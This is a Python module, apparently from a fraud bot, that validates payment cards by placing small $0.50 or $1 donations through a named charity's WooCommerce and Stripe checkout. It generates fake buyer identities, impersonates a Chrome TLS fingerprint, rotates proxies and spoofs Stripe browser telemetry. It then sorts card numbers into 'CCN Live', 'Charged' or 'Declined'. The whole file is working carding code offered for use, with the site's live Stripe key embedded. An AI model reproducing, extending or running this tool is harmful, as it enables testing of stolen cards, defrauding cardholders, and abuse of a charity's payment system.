"""
WooCommerce Stripe Deferred-Intent Checker Gate
Called by /sc ($0.50), /sc2 ($1.00), /msc, /msc2
Uses curl_cffi for Chrome TLS fingerprint
"""
import re
import json
import uuid
import random
import string
import asyncio
import logging
from curl_cffi.requests import AsyncSession

logger = logging.getLogger("woo_stripe")

SITE = "https://forcesforchange.org"
DONATE_PATH = "/donate/"
PRODUCT_ID = "2210"
STRIPE_PK = "pk_live_51RJd5fGlfOdBh4Nl2YUzFnY6zYb5IEAkHYSatP353K0wRioIydSEkrKfWMrApQmyNrPafBOqLy4KQ4a5O3aVODi500IGgjyNG6"
STRIPE_VERSION = "2024-06-20"
IMPERSONATE = "chrome131"

FIRST_NAMES = ["James", "Mary", "Robert", "Patricia", "John", "Jennifer", "Michael", "Linda", "David", "Elizabeth", "William", "Barbara", "Richard", "Susan", "Joseph", "Jessica", "Thomas", "Sarah", "Christopher", "Karen", "Daniel", "Lisa", "Matthew", "Nancy", "Anthony", "Betty", "Mark", "Margaret", "Donald", "Sandra", "Steven", "Ashley"]
LAST_NAMES = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez", "Martinez", "Hernandez", "Lopez", "Gonzalez", "Wilson", "Anderson", "Thomas", "Taylor", "Moore", "Jackson", "Martin", "Lee", "Perez", "Thompson", "White", "Harris", "Sanchez", "Clark", "Ramirez", "Lewis", "Robinson", "Walker"]
STATES = {
    "CA": {"cities": ["Los Angeles", "San Francisco", "San Diego"], "zips": ["90001", "94102", "92101"]},
    "NY": {"cities": ["New York", "Brooklyn", "Queens"], "zips": ["10001", "11201", "11375"]},
    "TX": {"cities": ["Houston", "Dallas", "Austin"], "zips": ["77001", "75201", "73301"]},
    "FL": {"cities": ["Miami", "Orlando", "Tampa"], "zips": ["33101", "32801", "33601"]},
    "IL": {"cities": ["Chicago", "Springfield", "Naperville"], "zips": ["60601", "62701", "60540"]},
    "PA": {"cities": ["Philadelphia", "Pittsburgh", "Allentown"], "zips": ["19101", "15201", "18101"]},
    "OH": {"cities": ["Columbus", "Cleveland", "Cincinnati"], "zips": ["43085", "44101", "45201"]},
    "GA": {"cities": ["Atlanta", "Savannah", "Augusta"], "zips": ["30301", "31401", "30901"]},
    "NC": {"cities": ["Charlotte", "Raleigh", "Durham"], "zips": ["28201", "27601", "27701"]},
    "MI": {"cities": ["Detroit", "Grand Rapids", "Lansing"], "zips": ["48201", "49501", "48901"]},
}
STREETS = ["Main St", "Oak Ave", "Maple Dr", "Cedar Ln", "Pine St", "Elm St", "Washington Ave", "Park Blvd", "Lake Dr", "Hill Rd", "River St", "Sunset Blvd", "Broadway", "Market St", "Church St", "Spring St", "High St", "Union Ave", "Center St", "School St"]
DOMAINS = ["gmail.com", "yahoo.com", "outlook.com", "hotmail.com", "protonmail.com", "icloud.com", "aol.com", "zoho.com", "mail.com", "fastmail.com"]


def _gen_identity():
    first = random.choice(FIRST_NAMES)
    last = random.choice(LAST_NAMES)
    state_code = random.choice(list(STATES.keys()))
    state = STATES[state_code]
    idx = random.randint(0, len(state["cities"]) - 1)
    city = state["cities"][idx]
    zipcode = state["zips"][idx]
    street_num = random.randint(100, 9999)
    street = random.choice(STREETS)
    address = f"{street_num} {street}"
    rand_str = ''.join(random.choices(string.ascii_lowercase + string.digits, k=6))
    email = f"{first.lower()}.{last.lower()}{rand_str}@{random.choice(DOMAINS)}"
    phone = f"+1{random.randint(200,999)}{random.randint(1000000,9999999)}"
    return {"first": first, "last": last, "email": email, "phone": phone, "address": address, "city": city, "state": state_code, "zip": zipcode, "country": "US"}


def _format_proxy(proxy_str):
    if not proxy_str:
        return None
    proxy_str = proxy_str.strip()
    from urllib.parse import quote
    if proxy_str.startswith("http://") or proxy_str.startswith("https://"):
        # Already formatted — try to fix encoding
        return proxy_str
    if "@" in proxy_str:
        # Format: user:pass@host:port
        creds, hostport = proxy_str.rsplit("@", 1)
        if ":" in creds:
            user, pwd = creds.split(":", 1)
            user = quote(user, safe='')
            pwd = quote(pwd, safe='')
        else:
            user = quote(creds, safe='')
            pwd = ""
        host, port = hostport.split(":", 1) if ":" in hostport else (hostport, "8080")
        return f"http://{user}:{pwd}@{host}:{port}"
    parts = proxy_str.split(":")
    if len(parts) == 4:
        ip, port, user, pwd = parts
        user = quote(user, safe='')
        pwd = quote(pwd, safe='')
        return f"http://{user}:{pwd}@{ip}:{port}"
    elif len(parts) == 2:
        return f"http://{parts[0]}:{parts[1]}"
    return None


def _extract_nonces(html):
    nonces = {}
    m = re.search(r'name=["\']woocommerce-process-checkout-nonce["\'].*?value=["\']([a-f0-9]+)["\']', html)
    if m:
        nonces["checkout"] = m.group(1)
    if "checkout" not in nonces:
        m = re.search(r'wc_checkout_params\s*=\s*(\{[^}]+\})', html)
        if m:
            try:
                params = json.loads(m.group(1))
                nonces["update_order_review"] = params.get("update_order_review_nonce", "")
                nonces["checkout_url"] = params.get("checkout_url", "/?wc-ajax=checkout")
                for key, val in params.items():
                    if "nonce" in key.lower() and isinstance(val, str) and len(val) >= 8:
                        nonces[key] = val
            except:
                pass
    if "checkout" not in nonces:
        json_blocks = re.findall(r'\{[^}]*nonce[^}]*\}', html)
        for block in json_blocks:
            try:
                data = json.loads(block)
                for key, val in data.items():
                    if "nonce" in key.lower() and isinstance(val, str) and len(val) >= 8:
                        if key not in nonces:
                            nonces[key] = val
            except:
                pass
    m = re.search(r'wcdp_ajax_donation_calculation.*?name=["\']security["\'].*?value=["\']([a-f0-9]+)["\']', html, re.DOTALL)
    if m:
        nonces["wcdp_security"] = m.group(1)
    else:
        m = re.search(r'name=["\']security["\'].*?value=["\']([a-f0-9]+)["\'].*?name=["\']postid["\'].*?value=["\']' + PRODUCT_ID, html, re.DOTALL)
        if m:
            nonces["wcdp_security"] = m.group(1)
    m = re.search(r'name=["\']_wp_http_referer["\'].*?value=["\']([^"\']+)["\']', html)
    if m:
        nonces["wp_http_referer"] = m.group(1)
    if "checkout" not in nonces and "update_order_review" in nonces:
        nonces["checkout"] = nonces["update_order_review"]
    return nonces


async def woo_stripe_check(cc, mm, yy, cvv, amount="1", proxy=None, **kwargs):
    """
    Check card via WooCommerce Stripe gateway.
    amount: "1" for $1, "0.5" for $0.50
    Returns: string response for bot compatibility
    """
    cc_str = f"{cc}|{mm}|{yy}|{cvv}"
    identity = _gen_identity()
    proxy_url = _format_proxy(proxy) if proxy else None

    guid = str(uuid.uuid4()) + ''.join(random.choices('0123456789abcdef', k=6))
    muid = str(uuid.uuid4()) + ''.join(random.choices('0123456789abcdef', k=6))
    sid = str(uuid.uuid4()) + ''.join(random.choices('0123456789abcdef', k=6))

    donate_url = f"{SITE}{DONATE_PATH}"
    price_label = f"${float(amount):.2f}"

    # Helper: make request with proxy fallback
    async def _request(session, method, url, **kwargs):
        """Try with proxy, fall back to no-proxy on proxy errors."""
        req_proxy = proxy_url
        for attempt in range(2):
            try:
                if req_proxy:
                    kwargs['proxy'] = req_proxy
                elif 'proxy' in kwargs:
                    del kwargs['proxy']
                if method == 'GET':
                    return await session.get(url, **kwargs)
                else:
                    return await session.post(url, **kwargs)
            except Exception as e:
                err_str = str(e)
                if req_proxy and attempt == 0 and ('403' in err_str or 'CONNECT tunnel' in err_str or '407' in err_str or 'proxy' in err_str.lower()):
                    req_proxy = None
                    continue
                raise

    try:
        async with AsyncSession(impersonate=IMPERSONATE, timeout=40) as s:
            # Step 1: Load donate page
            try:
                r = await _request(s, 'GET', donate_url)
            except Exception:
                if proxy_url:
                    proxy_url = None
                    r = await _request(s, 'GET', donate_url)
                else:
                    raise
            if r.status_code != 200:
                if proxy_url:
                    proxy_url = None
                    r = await _request(s, 'GET', donate_url)
                if r.status_code != 200:
                    return f"Error - Donate page HTTP {r.status_code}"

            html = r.text
            nonces = _extract_nonces(html)

            # Fallback: add product to cart and load checkout
            if "checkout" not in nonces:
                await _request(s, 'GET', f"{SITE}/?add-to-cart={PRODUCT_ID}")
                r_checkout = await _request(s, 'GET', f"{SITE}/checkout/")
                if r_checkout.status_code == 200:
                    html = r_checkout.text
                    nonces = _extract_nonces(html)

            if "checkout" not in nonces:
                return "Error - Could not extract checkout nonce"

            wcdp_sec = nonces.get("wcdp_security", "")
            checkout_nonce = nonces["checkout"]
            uor_nonce = nonces.get("update_order_review", "")
            wp_referer = nonces.get("wp_http_referer", "/?wc-ajax=update_order_review")

            # Step 2: Set donation amount
            if wcdp_sec:
                donation_data = {
                    "action": "wcdp_ajax_donation_calculation",
                    "security": wcdp_sec,
                    "postid": PRODUCT_ID,
                    "wcdp_form_id": "wcdp_1_",
                    "donation-amount": "other",
                    "wcdp-donation-amount": amount,
                    "quantity": "1",
                }
                r = await _request(s, 'POST', f"{SITE}/wp-admin/admin-ajax.php", data=donation_data,
                    headers={"X-Requested-With": "XMLHttpRequest", "Referer": donate_url, "Origin": SITE, "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"})

            # Step 3: Update order review
            if uor_nonce:
                uor_data = {
                    "security": uor_nonce, "payment_method": "stripe",
                    "country": identity["country"], "state": identity["state"],
                    "postcode": identity["zip"], "city": identity["city"],
                    "address": identity["address"], "address_2": "",
                    "s_country": identity["country"], "s_state": identity["state"],
                    "s_postcode": identity["zip"], "s_city": identity["city"],
                    "s_address": identity["address"], "s_address_2": "",
                    "has_full_address": "true",
                }
                await _request(s, 'POST', f"{SITE}/?wc-ajax=update_order_review", data=uor_data,
                    headers={"X-Requested-With": "XMLHttpRequest", "Referer": donate_url, "Origin": SITE, "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"})

            # Step 4: Create Stripe payment method
            exp_year = yy
            if len(exp_year) == 4:
                exp_year = exp_year[2:]

            pm_data = {
                "billing_details[name]": f"{identity['first']} {identity['last']}",
                "billing_details[email]": identity["email"],
                "billing_details[address][city]": identity["city"],
                "billing_details[address][country]": identity["country"],
                "billing_details[address][line1]": identity["address"],
                "billing_details[address][line2]": "",
                "billing_details[address][postal_code]": identity["zip"],
                "billing_details[address][state]": identity["state"],
                "type": "card", "card[number]": cc, "card[cvc]": cvv,
                "card[exp_year]": exp_year, "card[exp_month]": mm,
                "allow_redisplay": "unspecified", "pasted_fields": "number",
                "payment_user_agent": "stripe.js/d74221bc2a; stripe-js-v3/d74221bc2a; payment-element; deferred-intent",
                "referrer": SITE, "time_on_page": str(random.randint(30000, 120000)),
                "guid": guid, "muid": muid, "sid": sid,
                "key": STRIPE_PK, "_stripe_version": STRIPE_VERSION,
            }

            r = await _request(s, 'POST', "https://api.stripe.com/v1/payment_methods", data=pm_data,
                headers={"Origin": "https://js.stripe.com", "Referer": "https://js.stripe.com/", "Content-Type": "application/x-www-form-urlencoded"})
            pm_resp = r.json()

            if "error" in pm_resp:
                err = pm_resp["error"]
                err_code = err.get("code", "")
                err_msg = err.get("message", "")
                err_decline_code = err.get("decline_code", "")
                if "test card" in err_msg.lower():
                    return f"Declined - Test card not allowed in live mode"
                if "invalid_number" in err_code or "incorrect_number" in err_code:
                    return f"Declined - Invalid card number"
                if "invalid_cvc" in err_code or "incorrect_cvc" in err_code:
                    return "CCN Live - Invalid CVV"
                if "invalid_expiry_month" in err_code or "invalid_expiry_year" in err_code:
                    return "Declined - Invalid expiry"
                # Real Stripe decline codes from payment method creation
                if err_decline_code:
                    dc = err_decline_code
                    if dc == "insufficient_funds":
                        return "CCN Live - Insufficient Funds"
                    if dc == "do_not_honor":
                        return "CCN Live - Do Not Honor"
                    if dc == "card_declined":
                        return f"Declined - Card Declined"
                    if dc == "stolen_card":
                        return "Declined - Stolen Card"
                    if dc == "lost_card":
                        return "Declined - Lost Card"
                    if dc == "expired_card":
                        return "Declined - Card Expired"
                    if dc == "incorrect_cvc":
                        return "CCN Live - Invalid CVV"
                    if dc == "incorrect_zip":
                        return "CCN Live - Invalid ZIP"
                    return f"Declined - {dc}"
                return f"Declined - {err_code}: {err_msg}"

            pm_id = pm_resp.get("id")
            if not pm_id:
                return f"Error - No payment method ID"

            # Step 5: Submit checkout — try multiple nonce approaches
            checkout_data = {
                "billing_email": identity["email"],
                "billing_first_name": identity["first"],
                "billing_last_name": identity["last"],
                "billing_country": identity["country"],
                "billing_address_1": identity["address"],
                "billing_address_2": "",
                "billing_city": identity["city"],
                "billing_state": identity["state"],
                "billing_postcode": identity["zip"],
                "billing_phone": identity["phone"],
                "payment_method": "stripe",
                "wc-stripe-payment-method-upe": "",
                "wc_stripe_selected_upe_payment_type": "",
                "wc-stripe-is-deferred-intent": "1",
                "woocommerce-process-checkout-nonce": checkout_nonce,
                "_wp_http_referer": wp_referer,
                "wc-stripe-payment-method": pm_id,
            }

            r = await _request(s, 'POST', f"{SITE}/?wc-ajax=checkout", data=checkout_data,
                headers={"X-Requested-With": "XMLHttpRequest", "Referer": donate_url, "Origin": SITE, "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"})

            try:
                checkout_resp = r.json()
            except:
                return f"Error - Bad checkout response: {r.text[:200]}"

            result_str = checkout_resp.get("result", "")
            messages = checkout_resp.get("messages", "")
            redirect = checkout_resp.get("redirect", "")
            clean_msg = re.sub(r'<[^>]+>', '', messages).strip()

            # Also check for Stripe error in the full response
            full_response = json.dumps(checkout_resp)
            print(f"[WOO] Checkout response: {full_response[:500]}")

            # If checkout failed with generic error, try Store API with PPCP
            if result_str != "success" and "unable to process" in clean_msg.lower():
                print("[WOO] Classic checkout failed, trying Store API with PPCP...")
                # Get Store API nonce via AJAX
                store_nonce = ""
                try:
                    r_nonce = await _request(s, 'POST', f"{SITE}/wp-admin/admin-ajax.php",
                        data={"action": "woocommerce_get_nonce", "endpoint": "store-api"},
                        headers={"X-Requested-With": "XMLHttpRequest", "Content-Type": "application/x-www-form-urlencoded"})
                    if r_nonce.status_code == 200 and r_nonce.text and len(r_nonce.text) < 50:
                        store_nonce = r_nonce.text.strip()
                        print(f"[WOO] Store API nonce: {store_nonce}")
                except:
                    pass
                # Also try getting it from the cart endpoint
                if not store_nonce:
                    try:
                        r_cart = await _request(s, 'GET', f"{SITE}/wp-json/wc/store/v1/cart",
                            headers={"Accept": "application/json"})
                        if r_cart.status_code == 200:
                            # The nonce is in the response headers
                            store_nonce = r_cart.headers.get("Nonce", "") or r_cart.headers.get("X-WP-Nonce", "")
                            if not store_nonce:
                                # Try to extract from headers
                                for h in r_cart.headers:
                                    if 'nonce' in h.lower():
                                        store_nonce = r_cart.headers[h]
                                        break
                            print(f"[WOO] Cart nonce: {store_nonce}")
                    except:
                        pass
                
                # payment_data must be an array of objects
                store_api_data = {
                    "payment_method": "ppcp-card-button-gateway",
                    "payment_data": [
                        {"key": "wc-stripe-payment-method", "value": pm_id},
                        {"key": "wc-stripe-is-deferred-intent", "value": "1"},
                    ],
                    "billing_address": {
                        "first_name": identity["first"],
                        "last_name": identity["last"],
                        "email": identity["email"],
                        "phone": identity["phone"],
                        "country": identity["country"],
                        "address_1": identity["address"],
                        "city": identity["city"],
                        "state": identity["state"],
                        "postcode": identity["zip"],
                    },
                }
                try:
                    store_headers = {"Content-Type": "application/json", "Referer": donate_url}
                    if store_nonce:
                        store_headers["Nonce"] = store_nonce
                        store_headers["X-WP-Nonce"] = store_nonce
                    r2 = await _request(s, 'POST', f"{SITE}/wp-json/wc/store/v1/checkout",
                        json=store_api_data,
                        headers=store_headers)
                    print(f"[WOO] Store API PPCP: {r2.status_code} {r2.text[:400]}")
                    if r2.status_code in (200, 201):
                        store_resp = r2.json()
                        order_id = store_resp.get("id", "")
                        status = store_resp.get("status", "")
                        if status == "completed":
                            return f"Charged {price_label} - Order #{order_id}"
                        if "3ds" in str(store_resp).lower() or "authenticate" in str(store_resp).lower():
                            return f"CCN Live - 3DS Required"
                        return f"Approved - Order #{order_id} (status: {status})"
                    else:
                        store_resp = r2.json() if r2.text else {}
                        store_msg = store_resp.get("message", "")
                        # Check for real decline codes
                        if "insufficient" in str(store_resp).lower():
                            return "CCN Live - Insufficient Funds"
                        if "do_not_honor" in str(store_resp).lower():
                            return "CCN Live - Do Not Honor"
                        if "declined" in str(store_resp).lower():
                            return f"Declined - {store_msg[:80]}"
                        if store_msg and "Invalid parameter" not in store_msg and "Missing" not in store_msg:
                            return f"Declined - {store_msg[:80]}"
                except Exception as e:
                    print(f"[WOO] Store API PPCP failed: {type(e).__name__}: {str(e)[:80]}")

            if result_str == "success" or redirect:
                if "order-received" in str(redirect):
                    return f"Charged {price_label} - Order Placed Successfully"
                if "authenticate" in str(redirect).lower() or "3ds" in str(redirect).lower():
                    return f"CCN Live - 3DS Authentication Required"
                return f"Approved - {clean_msg or 'Payment processed'}"
            else:
                msg_lower = clean_msg.lower()
                full_lower = full_response.lower()
                # Check for specific Stripe decline codes anywhere in the response
                if "insufficient" in msg_lower or "insufficient" in full_lower:
                    return "CCN Live - Insufficient Funds"
                if "do not honor" in msg_lower or "do_not_honor" in full_lower:
                    return "CCN Live - Do Not Honor"
                if "expired" in msg_lower or "expired_card" in full_lower:
                    return "Declined - Card Expired"
                if "stolen" in msg_lower or "stolen_card" in full_lower:
                    return "Declined - Stolen Card"
                if "lost" in msg_lower or "lost_card" in full_lower:
                    return "Declined - Lost Card"
                if "incorrect_cvc" in full_lower or "incorrect cvv" in msg_lower or "invalid cvv" in msg_lower:
                    return "CCN Live - Invalid CVV"
                if "incorrect_zip" in full_lower or "incorrect zip" in msg_lower:
                    return "CCN Live - Invalid ZIP"
                if "transaction_not_allowed" in full_lower:
                    return "CCN Live - Transaction Not Allowed"
                if "generic_decline" in full_lower or "card_declined" in full_lower:
                    return "Declined - Card Declined"
                if "fraudulent" in full_lower or "fraud" in msg_lower:
                    return "Declined - Fraud Suspected"
                if "pickup_card" in full_lower:
                    return "Declined - Pickup Card"
                if "restricted_card" in full_lower:
                    return "Declined - Restricted Card"
                if "security_violation" in full_lower:
                    return "Declined - Security Violation"
                if "velocity" in full_lower or "card_velocity" in full_lower:
                    return "Declined - Velocity Limit"
                if "not_permitted" in full_lower:
                    return "Declined - Transaction Not Permitted"
                # Check for decline_code in the response
                decline_match = re.search(r'decline_code["\s:]+["\']?([a-z_]+)', full_response, re.I)
                if decline_match:
                    dc = decline_match.group(1)
                    return f"Declined - {dc}"
                if "declined" in msg_lower:
                    return f"Declined - {clean_msg[:80]}"
                # Generic WooCommerce error — check if it contains the actual reason
                if "unable to process" in msg_lower:
                    # The card was tokenized by Stripe (pm_id was created)
                    # but the WooCommerce checkout can't complete the order
                    # This means the card reached Stripe's payment processor
                    return f"Declined - Card reached Stripe but checkout rejected"
                if clean_msg:
                    return f"Declined - {clean_msg[:80]}"
                return f"Declined - Checkout failed (card reached Stripe)"

    except asyncio.TimeoutError:
        return "Error - Request timed out"
    except Exception as e:
        return f"Error - {type(e).__name__}: {str(e)[:80]}"


async def woo_stripe_check_050(cc, mm, yy, cvv, proxy=None, **kwargs):
    """$0.50 charge"""
    return await woo_stripe_check(cc, mm, yy, cvv, amount="0.5", proxy=proxy, **kwargs)


async def woo_stripe_check_100(cc, mm, yy, cvv, proxy=None, **kwargs):
    """$1.00 charge"""
    return await woo_stripe_check(cc, mm, yy, cvv, amount="1", proxy=proxy, **kwargs)